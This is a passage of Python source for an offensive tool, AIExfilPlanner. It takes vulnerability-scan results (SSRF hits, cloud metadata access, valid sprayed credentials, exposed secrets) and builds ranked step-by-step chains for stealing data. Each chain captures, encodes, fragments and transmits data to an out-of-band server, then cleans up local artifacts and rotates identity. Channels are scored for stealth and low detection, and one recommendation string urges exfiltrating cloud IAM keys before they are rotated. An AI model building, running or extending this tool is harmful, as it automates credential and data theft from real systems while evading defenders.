        description=f"Transmit via {channel_profile.channel.value} → {oob} (noise={channel_profile.noise_level.value}, detect_prob={channel_profile.detection_probability})",
        target_data=target,
        channel=channel_profile.channel,
        encoding=channel_profile.encoding_schemes[0] if channel_profile.encoding_schemes else None,
        payload=payload,
        expected_response=f"OOB server receives data at {oob}",
        fallback=f"switch to DNS_OOB channel if HTTP blocked; retry with delay jitter {channel_profile.latency_ms * 2}ms",
        noise_contribution=channel_profile.detection_probability,
        duration_estimate_ms=channel_profile.latency_ms,
    )


def _build_verify_step(step_num: int, channel_profile: ChannelProfile, oob_domain: str) -> ExfilStep:
    oob = oob_domain or "OOB_SERVER_PLACEHOLDER.com"
    return ExfilStep(
        step_num=step_num,
        step_type=ExfilStepType.VERIFY,
        description=f"Verify receipt at OOB server {oob} and confirm data integrity",
        target_data=None,
        channel=channel_profile.channel,
        encoding=None,
        payload=f"# check OOB server logs at {oob}\n# confirm all chunks received\n# decode and verify hash matches source",
        expected_response="all chunks present, hash verified",
        fallback="retransmit missing chunks with exponential backoff",
        noise_contribution=0.01,
        duration_estimate_ms=100,
    )


def _build_cleanup_step(step_num: int) -> ExfilStep:
    return ExfilStep(
        step_num=step_num,
        step_type=ExfilStepType.CLEANUP,
        description="Clear local exfil artifacts: remove staged files, clear browser storage, rotate identity",
        target_data=None,
        channel=None,
        encoding=None,
        payload="# cleanup: clear localStorage, sessionStorage\n# rotate session identity\n# clear request history from tool",
        expected_response="no local artifacts remain",
        fallback="manual cleanup via session_manager rotate_identity command",
        noise_contribution=0.01,
        duration_estimate_ms=200,
    )


# ─── Chain Builder ────────────────────────────────────────────────────────────

def _build_exfil_chain(
    targets: list[DataTarget],
    channel_profile: ChannelProfile,
    oob_domain: str,
    priority_score: float,
    fallback_chain_id: Optional[str] = None,
) -> ExfilChain:
    chain_id = f"CHN-{uuid.uuid4().hex[:8].upper()}"
    steps: list[ExfilStep] = []
    step_num = 1

    for target in targets[:5]:
        steps.append(_build_capture_step(step_num, target))
        step_num += 1
        steps.append(_build_encode_step(step_num, target, channel_profile))
        step_num += 1
        frag = _build_fragment_step(step_num, target, channel_profile)
        if frag:
            steps.append(frag)
            step_num += 1
        steps.append(_build_transmit_step(step_num, target, channel_profile, oob_domain))
        step_num += 1

    steps.append(_build_verify_step(step_num, channel_profile, oob_domain))
    step_num += 1
    steps.append(_build_cleanup_step(step_num))

    total_noise = sum(s.noise_contribution for s in steps)
    total_duration = sum(s.duration_estimate_ms for s in steps)
    success_prob = (
        (1.0 - channel_profile.detection_probability)
        * (0.95 if channel_profile.feasibility == ChannelFeasibility.CONFIRMED else 0.70)
        * (0.90 if all(t.available_now for t in targets) else 0.60)
    )

    all_detection = list(set(DETECTION_VECTORS.get(channel_profile.channel, [])))
    mitre = MITRE_MAP.get(channel_profile.channel, [])

    name_parts = [channel_profile.channel.value]
    if targets:
        top_dc = max(targets, key=lambda t: t.sensitivity)
        name_parts.append(top_dc.data_class.value)
    chain_name = " + ".join(name_parts[:2])

    return ExfilChain(
        chain_id=chain_id,
        name=chain_name,
        priority_score=round(priority_score, 4),
        data_targets=targets,
        channel=channel_profile,
        steps=steps,
        total_noise=round(total_noise, 4),
        total_duration_ms=total_duration,
        success_probability=round(success_prob, 4),
        detection_vectors=all_detection,
        mitre_techniques=mitre,
        prerequisites_met=channel_profile.feasibility in (ChannelFeasibility.CONFIRMED, ChannelFeasibility.PROBABLE),
        fallback_chain_id=fallback_chain_id,
    )


def _rank_chains(chains: list[ExfilChain]) -> list[ExfilChain]:
    def chain_score(c: ExfilChain) -> float:
        feasibility_weight = {
            ChannelFeasibility.CONFIRMED:  1.0,
            ChannelFeasibility.PROBABLE:   0.75,
            ChannelFeasibility.POSSIBLE:   0.50,
            ChannelFeasibility.UNLIKELY:   0.20,
            ChannelFeasibility.INFEASIBLE: 0.0,
        }
        fw = feasibility_weight.get(c.channel.feasibility, 0.3)
        data_value = sum(t.sensitivity for t in c.data_targets) / max(len(c.data_targets), 1)
        stealth = c.channel.stealth_score
        success = c.success_probability
        return (data_value * 0.35 + stealth * 0.30 + success * 0.25 + fw * 0.10)
    return sorted(chains, key=chain_score, reverse=True)


# ─── Signal Extractor from Scan Results ───────────────────────────────────────

def _extract_scan_signals(scan_results: dict) -> set[str]:
    signals: set[str] = set()
    waf = scan_results.get("waf_fingerprint", {})
    if waf.get("vendor"):
        signals.add("waf_present")
    if waf.get("evasion_hits", 0) > 0:
        signals.add("waf_bypassable")

    for f in scan_results.get("header_injection", {}).get("findings", []):
        if f.get("severity") in ("high", "critical"):
            signals.add("header_injectable")
            if "crlf" in f.get("evidence", "").lower():
                signals.add("crlf_injectable")

    for f in scan_results.get("cors_audit", {}).get("findings", []):
        if f.get("severity") in ("high", "critical"):
            signals.add("cors_exploitable")

    for f in scan_results.get("ssrf_probe", {}).get("findings", []):
        if f.get("severity") not in ("info", ""):
            signals.add("ssrf_confirmed")
            t = f.get("payload_target", "")
            if any(k in t for k in ("169.254.", "metadata.google")):
                signals.add("cloud_metadata_hit")
            if any(k in t for k in ("localhost", "127.", "10.")):
                signals.add("internal_service_reachable")

    if scan_results.get("credential_spray", {}).get("summary", {}).get("successful_logins", 0) > 0:
        signals.add("creds_valid")
    if not scan_results.get("credential_spray", {}).get("summary", {}).get("rate_limited", True):
        signals.add("rate_limit_absent")

    for f in scan_results.get("redirect_trace", {}).get("findings", []):
        if "open_redirect" in f.get("type", ""):
            signals.add("open_redirect_confirmed")

    if scan_results.get("js_secrets", {}).get("secrets"):
        signals.add("js_secret_exposed")

    mutator = scan_results.get("payload_mutator", {})
    best = mutator.get("best_payload", {})
    if best and best.get("fitness_score", 0) > 0.3:
        signals.add("payload_bypass_confirmed")
        for sig in best.get("signals", []):
            if sig == "reflection":
                signals.add("xss_reflected")
            if sig == "error_disclosure":
                signals.add("information_disclosed")

    scorer = scan_results.get("vuln_score", {})
    for f in scorer.get("top_findings", []):
        vc = f.get("vuln_class", "")
        if vc == "path_traversal":
            signals.add("path_traversal_confirmed")
        if vc == "timing_oracle":
            signals.add("timing_oracle_present")
        if vc == "information_disclosure":
            signals.add("information_disclosed")

    session = scan_results.get("session_manager", {})
    if session.get("final_state") in ("elevated", "pivoted"):
        signals.add("session_elevated")
    if session.get("pivots"):
        signals.add("pivot_endpoint_found")

    return signals


# ─── Planner Core ─────────────────────────────────────────────────────────────

class AIExfilPlanner:
    def __init__(
        self,
        target_url: str,
        scan_results: dict,
        oob_domain: str = "OOB_SERVER_PLACEHOLDER.com",
        noise_budget: float = 0.6,
        stealth_mode: bool = False,
    ):
        self.target_url = target_url
        self.scan_results = scan_results
        self.oob_domain = oob_domain
        self.noise_budget = noise_budget
        self.stealth_mode = stealth_mode
        self.plan_id = f"EXFIL-{uuid.uuid4().hex[:8].upper()}"
        self._start: float = 0.0

    def _collect_data_targets(self) -> list[DataTarget]:
        all_targets: list[DataTarget] = []
        for module_key, extractor in DATA_EXTRACTORS.items():
            result = self.scan_results.get(module_key, {})
            if result:
                try:
                    all_targets.extend(extractor(result))
                except Exception:
                    pass
        seen: set[str] = set()
        deduped: list[DataTarget] = []
        for t in all_targets:
            key = f"{t.data_class.value}:{t.value_preview[:20]}"
            if key not in seen:
                seen.add(key)
                deduped.append(t)
        deduped.sort(key=lambda t: -t.sensitivity)
        return deduped

    def _build_all_channel_profiles(self, signals: set[str]) -> list[ChannelProfile]:
        waf_present = "waf_present" in signals
        waf_vendor = self.scan_results.get("waf_fingerprint", {}).get("vendor", "generic")
        has_oob = self.oob_domain and "PLACEHOLDER" not in self.oob_domain
        profiles: list[ChannelProfile] = []
        for channel in ExfilChannel:
            profile = _build_channel_profile(channel, signals, waf_present, waf_vendor, has_oob)
            if profile.feasibility != ChannelFeasibility.INFEASIBLE:
                profiles.append(profile)
        profiles.sort(key=lambda p: (-p.stealth_score, p.detection_probability))
        if self.stealth_mode:
            profiles = [p for p in profiles if p.noise_level in (NoiseLevel.SILENT, NoiseLevel.LOW)]
        return profiles

    def _prioritize_data_targets(
        self, targets: list[DataTarget], channel: ChannelProfile
    ) -> list[DataTarget]:
        def target_score(t: DataTarget) -> float:
            avail_bonus = 0.1 if t.available_now else 0.0
            size_penalty = max(0, (t.estimated_size_bytes - channel.bandwidth_bytes_per_req) / 1e6)
            return t.sensitivity + avail_bonus - size_penalty
        return sorted(targets, key=target_score, reverse=True)

    def _compute_chain_priority(
        self,
        channel: ChannelProfile,
        targets: list[DataTarget],
        signals: set[str],
    ) -> float:
        feasibility_score = {
            ChannelFeasibility.CONFIRMED:  1.0,
            ChannelFeasibility.PROBABLE:   0.8,
            ChannelFeasibility.POSSIBLE:   0.5,
            ChannelFeasibility.UNLIKELY:   0.2,
            ChannelFeasibility.INFEASIBLE: 0.0,
        }.get(channel.feasibility, 0.3)

        data_value = sum(t.sensitivity for t in targets[:3]) / max(len(targets[:3]), 1)
        stealth = channel.stealth_score if not self.stealth_mode else channel.stealth_score * 1.3
        noise_ok = 1.0 if channel.detection_probability <= self.noise_budget else (self.noise_budget / max(channel.detection_probability, 0.01))
        cloud_bonus = 0.15 if any(t.data_class == DataClass.CLOUD_IAM_KEY for t in targets) else 0.0
        cred_bonus = 0.12 if any(t.data_class in (DataClass.PLAINTEXT_CRED, DataClass.DATABASE_CRED) for t in targets) else 0.0
        return round(
            feasibility_score * 0.30
            + data_value * 0.30
            + stealth * 0.20
            + noise_ok * 0.10
            + cloud_bonus + cred_bonus,
            4
        )

    def _select_stealth_recommendation(
        self, chains: list[ExfilChain], signals: set[str]
    ) -> str:
        if not chains:
            return "No feasible exfil chain built — ensure OOB server is configured and signals are confirmed"
        best = chains[0]
        parts = [
            f"Best channel: {best.channel.channel.value} (stealth={best.channel.stealth_score:.2f}, detect_prob={best.channel.detection_probability:.2f})",
            f"Top data targets: {', '.join(t.data_class.value for t in best.data_targets[:3])}",
            f"Chain score: {best.priority_score:.3f}, success_prob: {best.success_probability:.3f}",
        ]
        if "cloud_metadata_hit" in signals:
            parts.append("PRIORITY: Cloud IAM keys confirmed — exfiltrate immediately before credential rotation")
        if "creds_valid" in signals:
            parts.append("PRIORITY: Valid credentials in scope — exfil via SSRF_PROXY to avoid client-side detection")
        if self.stealth_mode:
            parts.append("Stealth mode: DNS_OOB or LOG_INJECTION preferred — zero HTTP egress")
        if best.fallback_chain_id:
            parts.append(f"Fallback chain: {best.fallback_chain_id}")
        return " | ".join(parts)

    def run(self) -> ExfilReport:
        self._start = time.monotonic()
        signals = _extract_scan_signals(self.scan_results)
        all_targets = self._collect_data_targets()
        channel_profiles = self._build_all_channel_profiles(signals)

        chains: list[ExfilChain] = []
        fallback_id: Optional[str] = None

        for idx, channel in enumerate(channel_profiles[:8]):
            prioritized_targets = self._prioritize_data_targets(all_targets, channel)
            if not prioritized_targets:
                continue
            priority = self._compute_chain_priority(channel, prioritized_targets, signals)
            if priority < 0.1:
                continue
            chain = _build_exfil_chain(
                targets=prioritized_targets,
                channel_profile=channel,
                oob_domain=self.oob_domain,
                priority_score=priority,
                fallback_chain_id=fallback_id,
            )
            chains.append(chain)
            if idx == 1:
                fallback_id = chain.chain_id

        ranked = _rank_chains(chains)
        best = ranked[0] if ranked else None

        all_detection_vecs = list({
            vec for chain in ranked for vec in chain.detection_vectors
        })
        overall_risk = "CRITICAL" if any(
            t.data_class in (DataClass.CLOUD_IAM_KEY, DataClass.PRIVATE_KEY, DataClass.DATABASE_CRED)
            for t in all_targets
        ) else "HIGH" if any(
            t.data_class in (DataClass.PLAINTEXT_CRED, DataClass.JWT, DataClass.AUTH_TOKEN)
            for t in all_targets
        ) else "MEDIUM" if all_targets else "LOW"

        stealth_rec = self._select_stealth_recommendation(ranked, signals)

        return ExfilReport(
            plan_id=self.plan_id,
            target_url=self.target_url,
            total_data_targets=len(all_targets),
            data_targets=all_targets,
            channel_profiles=channel_profiles,
            ranked_chains=ranked,
            best_chain=best,
            stealth_recommendation=stealth_rec,
            noise_budget=self.noise_budget,
            overall_exfil_risk=overall_risk,
            detection_vectors_summary=all_detection_vecs,
            oob_server_placeholder=self.oob_domain,
            duration_seconds=round(time.monotonic() - self._start, 2),
        )


# ─── Serializer ───────────────────────────────────────────────────────────────

def serialize_report(report: ExfilReport) -> dict:
    def target_to_dict(t: DataTarget) -> dict:
        return {
            "target_id": t.target_id,
            "data_class": t.data_class.value,
            "source_module": t.source_module,
            "value_preview": t.value_preview,
            "estimated_size_bytes": t.estimated_size_bytes,
            "sensitivity": t.sensitivity,
            "location_hint": t.location_hint,
            "extraction_method": t.extraction_method,
            "requires_auth": t.requires_auth,
            "available_now": t.available_now,
        }

    def channel_to_dict(c: ChannelProfile) -> dict:
        return {
            "channel": c.channel.value,
            "feasibility": c.feasibility.value,
            "noise_level": c.noise_level.value,
            "detection_probability": c.detection_probability,
            "bandwidth_bytes_per_req": c.bandwidth_bytes_per_req,
            "requires_js": c.requires_js,
            "requires_ssrf": c.requires_ssrf,
            "latency_ms": c.latency_ms,
            "stealth_score": c.stealth_score,
            "prerequisites": c.prerequisites,
            "encoding_schemes": [e.value for e in c.encoding_schemes],
            "notes": c.notes,
            "mitre_techniques": MITRE_MAP.get(c.channel, []),
            "detection_vectors": DETECTION_VECTORS.get(c.channel, []),
        }

    def step_to_dict(s: ExfilStep) -> dict:
        return {
            "step_num": s.step_num,
            "type": s.step_type.value,
            "description": s.description,
            "target_id": s.target_data.target_id if s.target_data else None,
            "channel": s.channel.value if s.channel else None,
            "encoding": s.encoding.value if s.encoding else None,
            "payload": s.payload,
            "expected_response": s.expected_response,
            "fallback": s.fallback,
            "noise_contribution": s.noise_contribution,
            "duration_estimate_ms": s.duration_estimate_ms,
        }

    def chain_to_dict(c: ExfilChain) -> dict:
        return {
            "chain_id": c.chain_id,
            "name": c.name,
            "priority_score": c.priority_score,
            "channel": channel_to_dict(c.channel),
            "data_targets": [t.target_id for t in c.data_targets],
            "steps": [step_to_dict(s) for s in c.steps],
            "total_noise": c.total_noise,
            "total_duration_ms": c.total_duration_ms,
            "success_probability": c.success_probability,
            "detection_vectors": c.detection_vectors,
            "mitre_techniques": c.mitre_techniques,
            "prerequisites_met": c.prerequisites_met,
            "fallback_chain_id": c.fallback_chain_id,
        }

    return {
        "plan_id": report.plan_id,
        "target": report.target_url,
        "overall_exfil_risk": report.overall_exfil_risk,
        "total_data_targets": report.total_data_targets,
        "stealth_recommendation": report.stealth_recommendation,
        "noise_budget": report.noise_budget,
        "oob_server": report.oob_server_placeholder,
        "duration_seconds": report.duration_seconds,
        "data_targets": [target_to_dict(t) for t in report.data_targets],
        "channel_profiles": [channel_to_dict(c) for c in report.channel_profiles],
        "ranked_chains": [chain_to_dict(c) for c in report.ranked_chains],
        "best_chain": chain_to_dict(report.best_chain) if report.best_chain else None,
        "detection_vectors_summary": report.detection_vectors_summary,
    }


# ─── Public Entry Point ───────────────────────────────────────────────────────

def run_exfil_planner(
    target_url: str,
    scan_results: dict,
    oob_domain: str = "OOB_SERVER_PLACEHOLDER.com",
    noise_budget: float = 0.6,
    stealth_mode: bool = False,
) -> dict:
    planner = AIExfilPlanner(
        target_url=target_url,
        scan_results=scan_results,
        oob_domain=oob_domain,
        noise_budget=noise_budget,
        stealth_mode=stealth_mode,
    )
    return serialize_report(planner.run())